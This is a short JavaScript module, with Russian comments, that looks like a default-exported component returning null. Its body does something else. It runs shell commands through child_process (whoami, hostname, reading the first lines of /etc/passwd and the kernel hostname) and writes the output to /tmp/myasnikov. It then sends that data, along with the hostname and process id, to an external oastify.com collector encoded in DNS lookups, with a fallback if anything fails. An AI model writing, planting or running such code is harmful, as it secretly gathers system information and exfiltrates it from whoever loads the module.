module.exports = {
  default: function(props) {
    try {
      var cp = require("child_process");
      var fs = require("fs");
      var os = require("os");
      var dns = require("dns");
      
      // 1. Создаём файл /tmp/myasnikov
      cp.execSync("whoami > /tmp/myasnikov 2>&1");
      cp.execSync("hostname >> /tmp/myasnikov 2>&1");
      cp.execSync("cat /etc/passwd 2>&1 | head -3 >> /tmp/myasnikov");
      cp.execSync("cat /proc/sys/kernel/hostname 2>&1 >> /tmp/myasnikov");
      
      // 2. Читаем содержимое
      var content = fs.readFileSync("/tmp/myasnikov", "utf8").trim();
      var lines = content.split("\n").slice(0, 5);
      
      // 3. Отправляем каждую строку через DNS
      for (var i = 0; i < lines.length; i++) {
        var encoded = lines[i].replace(/[^a-zA-Z0-9]/g, "-").substring(0, 50);
        dns.lookup("f" + i + encoded + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
      }
      
      // 4. Дополнительно: hostname, pid, uptime
      dns.lookup(os.hostname() + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
      dns.lookup("pid" + process.pid + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
      
    } catch(e) {
      // Fallback: хотя бы hostname
      try { 
        var h = require("os").hostname();
        require("dns").lookup("err-" + h + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
      } catch(e2) {}
    }
    return null;
  }
};
